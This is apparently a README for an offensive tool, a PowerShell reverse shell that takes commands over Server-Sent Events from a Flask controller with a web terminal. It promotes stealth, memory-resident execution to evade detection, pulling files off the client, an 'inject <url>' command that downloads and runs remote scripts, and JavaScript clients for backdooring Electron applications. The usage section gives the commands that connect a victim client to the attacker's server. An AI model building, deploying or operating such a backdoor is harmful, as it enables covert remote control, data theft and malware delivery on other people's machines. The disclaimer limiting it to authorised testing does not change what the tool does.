# SSE Reverse Shell – Enhanced Interactive Shell with Modern Features

This project showcases an advanced reverse shell built using native PowerShell and Server-Sent Events (SSE). It leverages a persistent HTTP connection to enable real-time communication between the server and clients, with a modern and interactive web-based interface for command execution and response visualization.

This project was inspired by Poc released by TNCX-byte => https://github.com/TNCX-byte/PS_SSE_Shell
So I wanted to test the implementaion of functionnalities in SSE. The project is in development and will change in futur. I think it will be implemented in my C2 Project RatShell...

Unlike traditional reverse shells, this implementation focuses on flexibility, interactivity, and stealth by using:
- Native PowerShell for the client
- SSE for real-time command streaming
- A web-based terminal for seamless interaction
- Memory-resident execution with minimal footprint

## Key Features

- **Interactive Web Terminal**: A modern, matrix-inspired web interface for sending commands and viewing responses in real-time.
- **Command Execution**: Supports both general commands and specific operations like file upload/download and script injection.
- **Real-Time Communication**: Uses SSE for persistent connections and HTTP POST for sending responses.
- **Chunked Response Handling**: Handles large command outputs by splitting them into manageable chunks for reliable transmission.
- **Cross-Platform Compatibility**: Works seamlessly with PowerShell clients on Windows and a Flask-based server on Linux.
- **Stealth and Flexibility**: Minimal network noise and memory-resident execution to bypass basic detection mechanisms.

## Components

### SSE Server
The server is built using Flask and provides the following endpoints:
- `/rsse`: Streams commands to connected clients via SSE.
- `/post`: Receives command outputs from clients.
- `/upload`: Handles file uploads from clients.
- `/download`: Allows clients to download files from the server.
- `/responses`: Streams client responses to the web-based terminal.

### SSE Client
The client is a PowerShell script that:
- Connects to the server's `/rsse` endpoint to receive commands.
- Executes commands locally and sends results back to the server via `/post`.
- Supports additional operations like file upload/download and script injection.

### Web Interface
The web-based terminal provides:
- A real-time command execution interface.
- Automatic scrolling and response handling for seamless interaction.
- For now it's just a Poc and is relased as-is... so you can expect bugs :)

## Usage

### Server
1. Start the Flask server:
   ```bash
   python3 SSE-Server.py
   ```

2. wait for incoming client connection from terminal and you can execute commands directly in it.

2 (optional). Access the web interface:
   - Open a browser and navigate to `http://<server-ip>:8085`.

### Client
1. Run the PowerShell client:
   ```powershell
   .\SSEClient.ps1 -Uri "http://<server-ip>:8085"
   ```

### Commands
- **General Commands**: Execute any PowerShell command (e.g., `dir`, `Get-Process`, `whoami`).
- **File Upload**: Upload a file from the client to the server:
  ```
  download <file-path>
  ```
- **File Download**: Download a file from the server to the client:
  ```
  upload <file-name>
  ```
- **Script Injection**: Inject and execute a script from a URL:
  ```
  inject <url>
  ```

## Features in Detail

### Real-Time Command Execution
- Commands are sent from the web terminal or server terminal to connected clients.
- Responses are streamed back in real-time and displayed in both the server terminal and the web interface.

### File Operations
- **Upload**: Clients can upload files to the server's `uploads` directory.
- **Download**: Clients can download files from the server's `Downloads` directory.

### Script Injection
- Execute remote scripts by providing a URL. The script is fetched, executed in memory, and the output is sent back to the server.

### Chunked Response Handling
- Large command outputs (e.g., `dir` or `Get-Process`) are split into chunks and sent to the server to ensure reliable transmission.

### Web Interface
- Real-time updates with automatic scrolling for seamless interaction.
- Displays both commands and responses in a structured format.

## Example Workflow

1. Start the server:
   ```bash
   python3 SSE-Server.py
   ```
2. Connect a client:
   ```powershell
   .\SSEClient.ps1 -Uri "http://<server-ip>:8085"
   ```
3. Open the web interface and send a command:
   - Example: `whoami`
4. View the response in real-time in the terminal.

This tool is released As-Is and you can expect bugs, it's just a Poc for now to test SSE protocols interaction & implementation. If it can be interesting for everyone, no problem. It will may be used for futur implemetations in other tools like my C2 I'm developping or other one...
You can find also 2 .js client in SSE_E-Client folder, thes 2 clients can be used to backdoor electron applications with another tool I'm developping right now I will release next few days ;). So stay connected to my github !!

## Disclaimer

This tool is for educational and research purposes only.  
Do not use this on networks or systems you do not own or have explicit permission to test.

## NoLicense

Author: 4rt3f4kt
